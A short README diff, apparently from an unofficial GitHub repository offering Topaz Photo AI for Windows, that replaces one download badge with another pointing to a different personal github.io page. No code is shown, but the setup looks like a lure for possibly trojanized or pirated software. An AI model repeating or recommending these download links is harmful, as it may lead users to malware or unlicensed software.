@@ -4,10 +4,7 @@
   <img src=https://www.elegantthemes.com/blog/wp-content/uploads/2023/10/topaz-photo-ai-review-ft-img.jpg" alt="Project Logo"/>
 </div>
 
-<div align="center">
-
-  [![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://topaz-photo-ai-windows-toolkit.github.io/.github/)
-</div>
+[![GET Topaz Photo](https://img.shields.io/badge/GET%20%E2%80%94%20Topaz-Photo-0078D6?style=for-the-badge&logoColor=white)](https://theomosinski.github.io/.github/Topaz-Photo)
 
 ---
 
